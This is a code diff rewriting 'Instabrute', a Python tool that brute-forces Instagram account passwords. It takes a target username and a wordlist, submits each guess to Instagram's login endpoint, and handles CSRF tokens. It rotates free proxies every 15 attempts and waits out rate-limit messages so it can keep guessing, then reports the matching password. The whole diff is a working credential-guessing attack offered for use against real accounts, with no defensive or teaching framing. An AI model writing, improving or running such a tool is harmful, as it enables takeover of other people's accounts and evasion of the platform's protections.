@@ -1,101 +1,116 @@
-
-'''
-TODO LIST:
-	Fix and make proxy function better
-	Sort code again
-	Add help function to all "Yes/no" questions
-	Add help  function to "Press enter to exit input"
-'''
+import argparse
 import requests
-import json
-import time
 import os
-import random
+import codecs
+
+import socket
+import socks
+
+import asyncio
+from proxybroker import Broker
+
+import time
 import sys
+import datetime
 
-#Help function
-def Input(text):
-	value = ''
-	if sys.version_info.major > 2:
-		value = input(text)
-	else:
-		value = raw_input(text)
-	return str(value)
+DELAY_BETWEEN = 4
 
-#The main class
-class Instabrute():
-	def __init__(self, username, passwordsFile='pass.txt'):
-		self.username = username
-		self.CurrentProxy = ''
-		self.UsedProxys = []
-		self.passwordsFile = passwordsFile
-		
-		#Check if passwords file exists
-		self.loadPasswords()
-		#Check if username exists
-		self.IsUserExists()
+#args parser
+parser = argparse.ArgumentParser()
+parser.add_argument('username', help='Instagram username of the user you want to attack')
+parser.add_argument('passwords_file', help='A passwords file for the software')
+args = parser.parse_args()
+if not os.path.exists(args.passwords_file):
+	exit('[*] Sorry, can\'t find file named "%s"' % args.passwords_file)
 
+#help functions
+#remove empty lines and duplicates 
+def cleanList(items):
+	newList = []
+	for x in items:
+		if not (x == None or x == ''):
+			if not x in newList:
+				newList.append(x)
+	return newList
 
-		UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
-		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-			self.randomProxy()
+#countdown function
+def countdown(t):
+	for remaining in range(t, 0, -1):
+		sys.stdout.write('\r')
+		remaining = datetime.timedelta(seconds=remaining)
+		h = int(remaining.total_seconds() / 3600)
+		m = int(remaining.total_seconds() / 60) % 60
+		remaining = str(remaining)
+		timeUnit = 'seconds'
+		if (m > 0): timeUnit = 'minutes'
+		if (h > 0): timeUnit = 'hours'
+		sys.stdout.write("[BREAK] {:2s} {:2s} remaining".format(remaining,timeUnit))
+		sys.stdout.flush()
+		time.sleep(1)
+	print ('')
 
-
-	#Check if password file exists and check if he contain passwords
-	def loadPasswords(self):
-		if os.path.isfile(self.passwordsFile):
-			with open(self.passwordsFile) as f:
-				self.passwords = f.read().splitlines()
-				passwordsNumber = len(self.passwords)
-				if (passwordsNumber > 0):
-					print ('[*] %s Passwords loads successfully' % passwordsNumber)
-				else:
-					print('Password file are empty, Please add passwords to it.')
-					Input('[*] Press enter to exit')
-					exit()
-		else:
-			print ('Please create passwords file named "%s"' % self.passwordsFile)
-			Input('[*] Press enter to exit')
-			exit()
-
-	#Choose random proxy from proxys file
-	def randomProxy(self):
-		plist = open('proxy.txt').read().splitlines()
-		proxy = random.choice(plist)
-
-		if not proxy in self.UsedProxys:
-			self.CurrentProxy = proxy
-			self.UsedProxys.append(proxy)
+#get all proxy
+proxies_list = []
+async def proxything(proxies):
+	print ('[*] Loading proxies')
+	while True:
+		proxy = await proxies.get()
+		if proxy is None: break
 		try:
-			print('')
-			print('[*] Check new ip...')
-			print ('[*] Your public ip: %s' % requests.get('http://myexternalip.com/raw', proxies={ "http": proxy, "https": proxy },timeout=10.0).text)
+			requests.get('https://www.instagram.com/')
+			proxies_list.append(proxy)
 		except Exception as e:
-			print  ('[*] Can\'t reach proxy "%s"' % proxy)
-		print('')
+			continue
+
+proxies = asyncio.Queue()
+asyncio.get_event_loop().run_until_complete(asyncio.gather(Broker(proxies).find(types=['HTTPS', 'HTTP'], limit=20), proxything(proxies)))
+#find proxy
+def setProxy():
+	for proxy in proxies_list:
+		print('[*] Proxy: %s' % proxy)
+		proxies_list.remove(proxy)
+		return True
 
 
-	#Check if username exists in instagram server
-	def IsUserExists(self):
+
+#main class - Instagram bruteforce
+class Instabrute():
+	def __init__(self, username, passwords):
+		self.username = username
+		if not self.userExists():
+			exit('[*] Can\'t find user named "%s"' % self.username)
+
+		self.passwords = passwords
+
+		self.attempts = 0 
+
+	def userExists(self):
 		r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username) 
-		if (r.status_code == 404):
-			print ('[*] User named "%s" not found' % username)
-			Input('[*] Press enter to exit')
-			exit()
-		elif (r.status_code == 200):
+		if r.status_code == 404:
+			return False
+		elif r.status_code == 200:
 			return True
+		else:
+			return False
 
-	#Try to login with password
-	def Login(self, password):
+	def _next(self):
+		if self.attempts % 15 == 0 and self.attempts != 0:
+			print ('[*] We need to change proxy :-)')
+			setProxy()
+		#add 1 attempt to the counter
+		self.attempts += 1
+		#remove the first password (the current)
+		self.passwords.pop(0)
+		#try the next password
+		self.login()
+
+	def login(self):
 		sess = requests.Session()
 
-		if len(self.CurrentProxy) > 0:
-			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }
-
-		#build requests headers
+		#requests headers and cookies
 		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 		sess.headers.update({
-			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
+			'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36',
 			'x-instagram-ajax':'1',
 			'X-Requested-With': 'XMLHttpRequest',
 			'origin': 'https://www.instagram.com',
@@ -109,60 +124,50 @@ class Instabrute():
 			'Accept-Encoding' : 'gzip, deflate'
 		})
 
-		#Update token after enter to the site
-		r = sess.get('https://www.instagram.com/') 
-		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
+		#update csrf token for the first time
+		sess.headers.update({'X-CSRFToken' : sess.get('https://www.instagram.com/').cookies.get_dict()['csrftoken']})
 
-		#Update token after login to the site 
-		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
-		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
-		
-		#parse response
-		data = json.loads(r.text)
-		if (data['status'] == 'fail'):
-			print (data['message'])
+		#try to login
+		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={
+			'username':self.username, 
+			'password':self.passwords[0]
+		}, allow_redirects=True)
 
-			UsePorxy = Input('[*] Do you want to use proxy (y/n): ').upper()
-			if (UsePorxy == 'Y' or UsePorxy == 'YES'):
-				print ('[$] Try to use proxy after fail.')
-				randomProxy() #Check that, may contain bugs
-			return False
+		if 'authenticated' in r.text:
+			if r.json()['authenticated']:
+				exit('[%s] Yay, the password is "%s"' % (str(self.attempts+1), self.passwords[0]))
+				#update csrf token after login try (if you want to keep the session)
+				#sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
+			else:
+				print ('[%s] Can\'t login with "%s"' % (str(self.attempts+1), self.passwords[0]))
 
-		#return session if password is correct 
-		if (data['authenticated'] == True):
-			return sess 
+				time.sleep(DELAY_BETWEEN)
+
+				#try the next password
+				self._next()
 		else:
-			return False
+			if 'message' in r.text:
+				if r.json()['message'] == 'Please wait a few minutes before you try again.':
+					print ('[MESSAGE] Please wait a few minutes before you try again.')
+					countdown(60*15)
+					setProxy()
+					pass #Do you want to wait or use proxy?
+				elif r.json()['message'] == 'checkpoint_required':
+					exit('[%s] Yay, the password is "%s"' % (str(self.attempts+1), self.passwords[0]))
+				else:
+					print ('[MESSAGE] %s' % r.json()['message'])
+			else:
+				print (r.text)
 
-
-
-
-
-
-instabrute = Instabrute(Input('Please enter a username: '))
-
-try:
-	delayLoop = int(Input('[*] Please add delay between the bruteforce action (in seconds): ')) 
-except Exception as e:
-	print ('[*] Error, software use the defult value "4"')
-	delayLoop = 4
-print ('')
-
-
-
-for password in instabrute.passwords:
-	sess = instabrute.Login(password)
-	if sess:
-		print ('[*] Login success %s' % [instabrute.username,password])
+setProxy()
+#main action
+with codecs.open(args.passwords_file, 'r', 'utf-8') as file:
+	passwords = file.read().splitlines()
+	if len(passwords) < 1:
+		exit('[*] The file is empty')
 	else:
-		print ('[*] Password incorrect [%s]' % password)
+		passwords = cleanList(passwords)
+		print ('[*] %s passwords loaded successfully' % len(passwords))
 
-	try:
-		time.sleep(delayLoop)
-	except KeyboardInterrupt:
-		WantToExit = str(Input('Type y/n to exit: ')).upper()
-		if (WantToExit == 'Y' or WantToExit == 'YES'):
-			exit()
-		else:
-			continue
-		
+bruteforce = Instabrute(args.username, passwords)
+bruteforce.login()
